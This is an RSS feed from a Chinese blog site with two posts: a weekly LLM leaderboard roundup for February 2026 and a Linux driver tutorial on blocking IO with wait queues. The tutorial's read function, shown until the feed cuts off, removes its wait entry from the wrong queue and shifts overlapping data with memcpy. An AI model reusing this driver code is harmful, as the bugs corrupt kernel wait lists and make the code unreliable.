{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "大模型榜单周报（2026/02/15）",
      "link": "https://www.cnblogs.com/xjk15082/p/19619738",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xjk15082/p/19619738\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 10:15\">\n    <span>大模型榜单周报（2026/02/15）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1-本周概览\">1. 本周概览</h2>\n<p>本周大模型行业迎来多项重要发布与升级。ChatGPT启动广告测试，谷歌宣布对Gemini3 Deep Think进行重大升级，推出专门针对科学、研究与工程场景的\"推理模式\"。千问团队推进Qwen3.5系列模型发布，字节正式发布新一代视频创作模型Seedance2.0。DeepSeek上线新模型，上下文窗口提升至1M tokens，智谱上线并开源GLM-5，MiniMax上线最新旗舰模型M2.5。OpenRouter榜单出现重大变动，Kimi K2.5从第3名跃升至第1名，使用量翻倍增长125%，Moonshot超越OpenAI成为第三大厂商。Anthropic在多个能力榜单中表现强劲，Claude 4.6包揽编程能力榜单前两名，Text Arena榜单包揽前2名。</p>\n<h2 id=\"2-重点关注事件\">2. 重点关注事件</h2>\n<ul>\n<li><strong>ChatGPT启动广告测试</strong>（2.10）：OpenAI开始在ChatGPT中测试广告功能，标志着商业化探索的新阶段。</li>\n<li><strong>谷歌宣布Gemini 3 Deep Think重大升级</strong>（2.12）：推出专门针对科学、研究与工程场景开发的\"推理模式\"，旨在推动智能前沿发展。</li>\n<li><strong>千问团队推进Qwen 3.5系列发布</strong>（2.9）：已向HuggingFace代码库提交相关支持PR，新系列模型即将面世。</li>\n<li><strong>字节正式发布Seedance 2.0</strong>（2.12）：新一代视频创作模型采用统一的多模态音视频联合生成架构，支持文字、图片、音频、视频四种模态输入，集成了目前业界最全面的多模态内容参考和编辑能力。</li>\n<li><strong>DeepSeek上线新模型</strong>（2.12）：核心升级包括上下文窗口上限提升至1M tokens，长上下文场景表现突出；整体响应速度明显提升；知识库截止日期显示为2025年5月。新模型仍为纯文本模型，不支持多模态输入。目前官方尚未发布正式公告。</li>\n<li><strong>智谱上线并开源GLM-5</strong>（2.12）：定位为面向复杂系统工程和长程Agentic任务的基座模型，在Coding与Agent能力上取得开源SOTA表现。</li>\n<li><strong>MiniMax上线M2.5旗舰模型</strong>（2.12）：最新旗舰模型现已开放访问，用户可通过Web端和桌面端的MiniMax Agent调用该模型。</li>\n</ul>\n<h2 id=\"3-榜单变化\">3. 榜单变化</h2>\n<h3 id=\"openrouter模型调用量排名\">OpenRouter模型调用量排名</h3>\n<ul>\n<li><strong>整体调用量</strong>：Kimi K2.5从第3名跃升至第1名，使用量翻倍增长125%，以1.52T tokens遥遥领先，是第2名的2倍多。Anthropic两个模型新入前十，Claude Opus 4.6入榜。Trinity Large Preview (free)作为免费模型增长81%。另外有两个模型跌出前十：Grok Code Fast 1（上期第8）和Claude Opus 4.5（上期第6，被4.6替代）。</li>\n<li><strong>模型市占率</strong>：Moonshot超越OpenAI，成为OpenRouter平台第三大厂商，与Google、Anthropic并立。Google虽然总量微增（1.58T→1.68T），但市场份额流失近1/6，从23%降到19%。MiniMax份额大增1.7%（4.7%→6.4%），tokens涨80%。</li>\n<li><strong>模型吞吐量</strong>：OpenAI gpt-oss 120B速度暴涨29%（447→576 tok/s），排名反超20B小模型。Meta 3款模型同时进入Top 10，成为入围最多的厂商，Llama 3.3 70B直接挤掉Google Gemini 2.5 Flash Lite，Llama 4系列（Maverick+Scout）双入榜。</li>\n<li><strong>编程调用量</strong>：Kimi在编程场景展现统治力，市占率30.8%，远超其在通用场景的12.6%份额，同时领先第二名近20个百分点。Claude Opus 4.6空降第3，按Anthropic整体下滑。上期Anthropic双模型（Opus 4.5 + Sonnet 4.5）合计16.6%，本期Anthropic双模型（Opus 4.6 + Sonnet 4.5）合计11.3%。</li>\n</ul>\n<h3 id=\"各领域能力榜单\">各领域能力榜单</h3>\n<ul>\n<li><strong>大语言模型Text Arena</strong>：Anthropic包揽前2，终结了Google霸榜，分数突破1500分大关，\"thinking\"版本领先基础版6分。Kimi K2.5-thinking入榜，第18名（1447分）。GLM-5第11名（1452分），智谱成为新的中国质量代表。</li>\n<li><strong>编程能力榜单（Code Arena）</strong>：Claude 4.6霸榜前两名，分数突破1560分，较上期冠军（1500分）提升4.5%；Anthropic包揽前3（含4.5-thinking-32k），保持绝对统治。Google模型被GPT-5.2-high（第4）、GLM-5（第6）超越。智谱GLM-5成为本期最大黑马，直接杀入前6，分数1449分，超越Google Gemini 2.5 Pro。</li>\n<li><strong>文生图能力榜单（Artificial Analysis Text to Image Leaderboard）</strong>：xAI Grok空降第5，xAI首次进入图像生成Top 10，分数1190，超越字节Seedream 4.0（1189）和FLUX.2 [flex]（1184）。</li>\n<li><strong>理科能力榜单（GPQA LLM Stats）</strong>：无重要变化。</li>\n<li><strong>前沿数学能力榜单（EPOCH AI FrontierMath）</strong>：Anthropic 4.6代全面取代4.5代，3款配置全部进入Top 5。Google Gemini 3 Pro Preview下跌，从第4跌至第6。</li>\n<li><strong>HLE（Human's Last Exam）</strong>：无重要变化。</li>\n</ul>\n<h2 id=\"4-排行榜\">4. 排行榜</h2>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>第一名</th>\n<th>第二名</th>\n<th>第三名</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>模型调用量</td>\n<td>Kimi K2.5</td>\n<td>Gemini 3 Flash Preview</td>\n<td>DeepSeek V3.2</td>\n</tr>\n<tr>\n<td>公司市占率</td>\n<td>Google</td>\n<td>Anthropic</td>\n<td>MoonShotai</td>\n</tr>\n<tr>\n<td>模型速度</td>\n<td>gpt-oss-safeguard-20b</td>\n<td>Qwen3 32B</td>\n<td>gpt-oss-120b</td>\n</tr>\n<tr>\n<td>编程模型调用量</td>\n<td>Kimi K2.5</td>\n<td>MiniMax M2.1</td>\n<td>Claude Opus 4.6</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"各公司按不同能力领域排名汇总\">各公司按不同能力领域排名汇总</h3>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>领先公司</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大语言模型 Text Arena</td>\n<td>Anthropic、Google、xAI、OpenAI</td>\n</tr>\n<tr>\n<td>编程能力 Code Arena</td>\n<td>Anthropic、OpenAI、智谱、Google、Kimi</td>\n</tr>\n<tr>\n<td>编程能力 LiveCodeBench</td>\n<td>Anthropic、OpenAI、Google</td>\n</tr>\n<tr>\n<td>代码工程任务能力 SWE-bench</td>\n<td>Anthropic、Google、OpenAI</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Edit Arena</td>\n<td>OpenAI、Google、xAI、字节、腾讯</td>\n</tr>\n<tr>\n<td>文生图能力 Text-to-Image Arena</td>\n<td>OpenAI、Google、xAI、Black Forest Labs、腾讯</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Editing Leaderboard</td>\n<td>OpenAI、Google、xAI、腾讯、字节、Black Forest Labs、阿里巴巴、Reve</td>\n</tr>\n<tr>\n<td>文生图能力 Text to Image Leaderboard</td>\n<td>OpenAI、Google、Black Forest Labs、xAI、字节</td>\n</tr>\n<tr>\n<td>GPQA</td>\n<td>OpenAI、Google、Anthropic、xAI</td>\n</tr>\n<tr>\n<td>FrontierMath</td>\n<td>OpenAI、Anthropic、Google、月之暗面、DeepSeek</td>\n</tr>\n<tr>\n<td>Humanity's Last Exam</td>\n<td>Google、OpenAI、Anthropic</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>关注我，第一时间掌握更多AI前沿资讯！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 10:15</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xjk15082\">KAI智习</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "linux设备驱动阻塞IO应用",
      "link": "https://www.cnblogs.com/cear/p/19617828",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/cear/p/19617828\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 09:51\">\n    <span>linux设备驱动阻塞IO应用</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        使用wait_queue_head_t实现阻塞上层应用\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h2>1. 驱动中阻塞相关函数的基础</h2>\n<h3>1.1 wait_queue_head_t</h3>\n<p>定义等待队列头</p>\n<div class=\"cnblogs_code\">\n<pre>#include &lt;linux/wait.h&gt;\n<span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\">\n * lock：自旋锁，用于保护队列操作（如添加/删除等待项）的并发安全\n * head：链表头，指向等待队列项的链表\n </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\ntypedef </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> wait_queue_head {\n    spinlock_t      </span><span style=\"color: rgba(0, 0, 255, 1);\">lock</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> list_head    head;\n} wait_queue_head_t;</span></pre>\n</div>\n<h3>1.2 init_waitqueue_head</h3>\n<p>初始化一个已经分配了内存的等待队列头，设置其自旋锁和链表为空</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> init_waitqueue_head(wait_queue_head_t *q);</pre>\n</div>\n<h3>1.3 DECLARE_WAITQUEUE</h3>\n<p><strong>静态声明并初始化一个等待队列项（wait queue entry）</strong>。该宏创建一个&nbsp;<span class=\"cnblogs_code\">wait_queue_entry</span>&nbsp;类型的变量，并将指定的进程描述符&nbsp;<span class=\"cnblogs_code\">tsk</span>&nbsp;（当前进程为 <span class=\"cnblogs_code\">current</span>&nbsp;）与该队列项关联，同时设置默认的唤醒函数</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 0, 1);\">DECLARE_WAITQUEUE(name, tsk);\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 使用方式</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">DECLARE_WAITQUEUE(wait, current);\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 展开后为</span>\nwait_queue_entry_t wait =<span style=\"color: rgba(0, 0, 0, 1);\"> {\n    .</span><span style=\"color: rgba(0, 0, 255, 1);\">private</span>    = current,                 <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 指向等待的进程 task_struct</span>\n    .func       = default_wake_function,   <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 唤醒时调用的函数</span>\n    .task_list  = { NULL, NULL }           <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 链表节点，用于挂入等待队列头</span>\n};</pre>\n</div>\n<h3>1.4 add_wait_queue</h3>\n<p>将一个已经初始化好的等待队列项&nbsp;<span class=\"cnblogs_code\">wait</span>&nbsp;添加到等待队列头&nbsp;<span class=\"cnblogs_code\">queue</span>&nbsp;所管理的队列中。添加后，该队列项就成为了等待队列的一部分</p>\n<p>在进程准备睡眠之前，先将自己添加到等待队列，这样其他唤醒者才能找到它</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> add_wait_queue(wait_queue_head_t *queue, wait_queue_t *wait);</pre>\n</div>\n<h3>1.5 set_current_state</h3>\n<p class=\"ds-markdown-paragraph\"><strong>设置当前进程的状态</strong>，将&nbsp;<span class=\"cnblogs_code\">current-&gt;state</span>&nbsp;赋值为&nbsp;<span class=\"cnblogs_code\">new_state</span>&nbsp;<code>，</code>进程状态定义在&nbsp;<span class=\"cnblogs_code\">&lt;linux/sched.h&gt;</span>&nbsp;中，常见的有：</p>\n<ul>\n<li>\n<p class=\"ds-markdown-paragraph\"><code>TASK_RUNNING</code>：可运行状态（正在运行或就绪）。</p>\n</li>\n<li>\n<p class=\"ds-markdown-paragraph\"><code>TASK_INTERRUPTIBLE</code>：可中断的睡眠状态，可以被信号唤醒。</p>\n</li>\n<li>\n<p class=\"ds-markdown-paragraph\"><code>TASK_UNINTERRUPTIBLE</code>：不可中断的睡眠状态，只能由显式唤醒解除。</p>\n</li>\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> set_current_state(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> new_state);        <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 有内存屏障，保证顺序</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">void</span> __set_current_state(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> new_state);      <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 没有内存屏障    </span></pre>\n</div>\n<h3>1.6 <code>remove_wait_queue</code></h3>\n<p>将之前通过&nbsp;<span class=\"cnblogs_code\">add_wait_queue</span>&nbsp;添加的等待队列项从等待队列中移除；当进程被唤醒并重新获得 CPU 后，通常需要调用此函数将自己从等待队列中删除，表示不再等待该条件；如果忘记移除，队列项仍留在等待队列中，可能导致后续不必要的唤醒或资源泄漏</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> remove_wait_queue(wait_queue_head_t *queue, wait_queue_t *wait);</pre>\n</div>\n<h3>1.7 <code>wake_up</code></h3>\n<p>唤醒队列中所有进程（包括 <span class=\"cnblogs_code\">TASK_UNINTERRUPTIBLE</span>和&nbsp;<span class=\"cnblogs_code\">TASK_INTERRUPTIBLE</span>&nbsp;）</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> wake_up(wait_queue_head_t *queue);</pre>\n</div>\n<p>唤醒等待队列&nbsp;<span class=\"cnblogs_code\">queue</span>&nbsp;中所有状态为&nbsp;<span class=\"cnblogs_code\">TASK_INTERRUPTIBLE</span>&nbsp;的进程。这些进程将被设置为&nbsp;<span class=\"cnblogs_code\">TASK_RUNNING</span>&nbsp;并移入运行队列，等待调度器选择它们运行</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> wake_up_interruptible(wait_queue_head_t *queue);</pre>\n</div>\n<h2>2. 阻塞驱动使用例子</h2>\n<div class=\"cnblogs_code\">\n<pre>#include &lt;linux/init.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/errno.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/mm.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/sched.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/module.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/ioctl.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/io.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/fs.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/cdev.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/uaccess.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/slab.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/wait.h&gt;\n\n<span style=\"color: rgba(0, 0, 255, 1);\">#define</span> GLOBALFIFO_SIZE    1024\n<span style=\"color: rgba(0, 0, 255, 1);\">#define</span> GLOBALMEM_MAGIC    'M'\n<span style=\"color: rgba(0, 0, 255, 1);\">#define</span> MEM_CLEAR        _IO(GLOBALMEM_MAGIC, 0)\n\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> cdev m_cdev;            <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 字符设备 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    unsigned </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> current_len;        <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> fifo有效数据长度 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    unsigned </span><span style=\"color: rgba(0, 0, 255, 1);\">char</span> mem[GLOBALFIFO_SIZE];    <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 全局内存 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> semaphore sem;            <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 并发控制信号量 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    wait_queue_head_t r_wait;        </span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 阻塞读等待队列头 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    wait_queue_head_t w_wait;        </span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 阻塞写等待队列头 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n};\n\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_major = <span style=\"color: rgba(128, 0, 128, 1);\">266</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 存放字符设备私有数据</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev*<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_devp;\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user open fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_open(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> inode* inode, <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file*<span style=\"color: rgba(0, 0, 0, 1);\"> filp) {\n    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev*<span style=\"color: rgba(0, 0, 0, 1);\"> dev;\n    dev </span>= container_of(inode-&gt;i_cdev, <span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev, m_cdev);\n    filp</span>-&gt;private_data =<span style=\"color: rgba(0, 0, 0, 1);\"> dev;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user release fd</span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_release(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> inode* inode, <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file*<span style=\"color: rgba(0, 0, 0, 1);\"> filp) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user read fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> ssize_t globalfifo_read(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file* filp, <span style=\"color: rgba(0, 0, 255, 1);\">char</span> __user* buf, size_t count, loff_t*<span style=\"color: rgba(0, 0, 0, 1);\"> ppos) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev* dev = filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">private_data;    \n    \n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 定义等待队列</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    DECLARE_WAITQUEUE(wait, current);    \n\n    down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 1.将等待队列加入到等待队列头</span>\n    add_wait_queue(&amp;dev-&gt;r_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 2.循环检查等待条件（防止假唤醒，如果唤醒后不满足条件会再次睡眠）</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">while</span> (dev-&gt;current_len == <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 3. 检查非阻塞模式直接返回</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span> (filp-&gt;f_flags &amp;<span style=\"color: rgba(0, 0, 0, 1);\"> O_NONBLOCK) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EAGAIN;\n            up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 4.改变进程状态为可中断睡眠</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        __set_current_state(TASK_INTERRUPTIBLE);\n\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 5.调度其他进程执行（真正睡眠）        </span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        schedule();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 6.检查如果有信号到达返回上层处理错误（自己的唤醒只将状态转换为TASK_RUNNING，但信号到来也会做这个处理）</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span><span style=\"color: rgba(0, 0, 0, 1);\"> (signal_pending(current)) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">ERESTARTSYS;\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        \n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 被唤醒后的处理</span>\n        down(&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    }\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(count &gt; dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len)\n        count </span>= dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len;\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(copy_to_user(buf, dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">mem, count)) {\n        ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EFAULT;\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n           set_current_state(TASK_RUNNING);\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n    } </span><span style=\"color: rgba(0, 0, 255, 1);\">else</span><span style=\"color: rgba(0, 0, 0, 1);\"> {\n        memcpy(dev</span>-&gt;mem, dev-&gt;mem + count, dev-&gt;current_len -<span style=\"color: rgba(0, 0, 0, 1);\"> count);\n        dev</span>-&gt;current_len -=<span style=\"color: rgba(0, 0, 0, 1);\"> count;\n            \n        wake_up_interruptible(</span>&amp;dev-&gt;w_wait);    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 读出数据后唤醒写进程</span>\n        ret =<span style=\"color: rgba(0, 0, 0, 1);\"> count;\n    }\n    \n    up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n    set_current_state(TASK_RUNNING);\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user write fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span> \n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> ssize_t globalfifo_write(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file* filp, <span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">char</span> __user* buf, size_t count, loff_t*<span style=\"color: rgba(0, 0, 0, 1);\"> ppos) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev* dev = filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">private_data;    \n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 定义等待队列</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    DECLARE_WAITQUEUE(wait, current);\n    down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 1.将等待队列插入写等待队列头</span>\n    add_wait_queue(&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 2.循环等待 若FIFO满则应该挂起</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">while</span> (dev-&gt;current_len ==<span style=\"color: rgba(0, 0, 0, 1);\"> GLOBALFIFO_SIZE) {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 3. 若非阻塞则直接返回</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span> (filp-&gt;f_flags &amp;<span style=\"color: rgba(0, 0, 0, 1);\"> O_NONBLOCK) {\n            up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EAGAIN;\n            